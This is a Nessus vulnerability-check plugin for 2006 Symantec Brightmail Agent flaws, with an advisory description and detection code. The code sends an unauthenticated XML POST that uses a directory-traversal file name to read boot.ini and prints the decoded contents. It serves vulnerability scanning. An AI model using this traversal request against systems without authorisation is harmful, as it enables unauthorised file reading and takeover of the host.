#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server is affected by multiple vulnerabilities. 

Description :

The remote host is running Brightmail AntiSpam, an anti-spam and anti-
virus filter for mail servers, and includes Brightmail Agent, a web
server intended to be used by a Brightmail Control Center to manage
the Brightmail Scanner. 

The version of Brightmail Agent installed on the remote host does not
require authentication and thus allows attackers to gain
administrative control of the affected application.  An attacker can
exploit this issue to stop or disable the Brightmail Scanner's
services, which could disrupt mail delivery for legitimate users; or
to read and write to files associated with the application, which
could result in the disclosure of sensitive information or
reconfiguration of the application itself. 

In addition, the Brightmail Agent suffers from a directory traversal
vulnerability such that reads and writes are not limited to the
application's directory.  Successful exploitation of this issue may
result in a complete compromise of the affected host since, under
Windows, the application runs with LOCAL SYSTEM privileges. 

See also :

http://securityresponse.symantec.com/avcenter/security/Content/2006.07.27.html

Solution :

Either restrict access to Brightmail Agent (refer to document id
2004123109522163 in Symantec's Support Knowledge Base) or upgrade to
Symantec Brightmail AntiSpam 6.0.4 / Symantec Mail Security for SMTP
5.0 or later. 

Risk factor :

Medium / CVSS Base Score : 4.6
(AV:R/AC:L/Au:NR/C:P/I:P/A:N/B:N)";


if (description)
{
  script_id(22158);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-4013", "CVE-2006-4014");
  script_bugtraq_id(19182);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"27589");
    script_xref(name:"OSVDB", value:"27590");
  }

  script_name(english:"Brightmail AntiSpam bmagent Multiple Vulnerabilities");
  script_summary(english:"Tries to read a local file using Brightmail Agent");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 41002);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:41002);
if (!get_port_state(port)) exit(0);


# Unless we're paranoid, make sure the banner looks like bmagent.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || "HTTP/1.1 404 NotOK" >!< banner) exit(0);
}


# Try to exploit the flaw to read a file.
file = "$CONFIGDIR$$/$..$/$..$/$..$/$..$/$..$/$..$/$..$/$..$/$boot.ini";
rid = string(unixtime(), rand() % 1000);
postdata = string(
  '<?xml version="1.0" encoding="utf-8" ?>', 
  "<REQUEST>",
  "  <DATABLOB-GET>",
  "    <REQUEST-ID>", rid, "</REQUEST-ID>",
  "    <FLAG>0</FLAG>",
  "    <FILE-NAME>", file, "</FILE-NAME>",
  "  </DATABLOB-GET>",
  "</REQUEST>"
);
req = string(
  "POST / HTTP/1.1\r\n",
  "Content-Type: text/plain; charset=ISO-8859-1\r\n",
  "User-Agent: Jakarta Commons-HttpClient/2.0final\r\n",
  "Host: ", get_host_name(), "\r\n",
  "Content-Length: ", strlen(postdata), "\r\n",
  "\r\n",
  postdata
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# Extract the contents of the file.
pat = "<DATABLOB-BASE64.+>(.+)</DATABLOB-BASE64>";
matches = egrep(pattern:pat, string:res);
content = NULL;
if (matches)
{
  foreach match (split(matches))
  {
    match = chomp(match);
    content = eregmatch(pattern:pat, string:match);
    if (!isnull(content)) 
    {
      content = content[1];
      content = base64_decode(str:content);
      break;
    }
  }
}


# There's a problem if looks like boot.ini.
if (content && "[boot loader]">< content)
{
  report = string(
    desc,
    "\n\n",
    "Plugin output :\n",
    "\n",
    "Here are the contents of the file '\\boot.ini' that Nessus\n",
    "was able to read from the remote host :\n",
    "\n",
    content
  );
  security_warning(port:port, data:report);
}
